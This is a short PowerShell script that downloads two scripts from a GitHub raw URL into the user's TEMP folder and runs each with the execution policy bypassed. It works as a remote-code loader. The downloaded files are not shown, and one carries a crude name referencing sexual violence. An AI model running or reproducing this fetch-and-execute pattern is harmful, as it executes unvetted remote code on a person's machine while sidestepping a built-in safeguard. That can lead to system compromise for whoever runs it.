# ===============================
# CONFIG
# ===============================

$ps1Urls = @(
    "https://raw.githubusercontent.com/Star2likesgirls/powershell/refs/heads/main/rapebootloader.ps1",
    "https://raw.githubusercontent.com/Star2likesgirls/powershell/refs/heads/main/pleaseinsertcoin.ps1"
)

$tempDir = $env:TEMP

# ===============================
# DOWNLOAD + RUN EACH PS1
# ===============================

foreach ($url in $ps1Urls) {

    $fileName = Split-Path $url -Leaf
    $localPath = Join-Path $tempDir $fileName

    Write-Host "Downloading $fileName..."
    Invoke-WebRequest -Uri $url -OutFile $localPath -UseBasicParsing

    Write-Host "Running $fileName..."
    Start-Process powershell `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$localPath`"" `
        -Wait

    Write-Host "$fileName finished."
}

Write-Host "All PowerShell scripts completed."
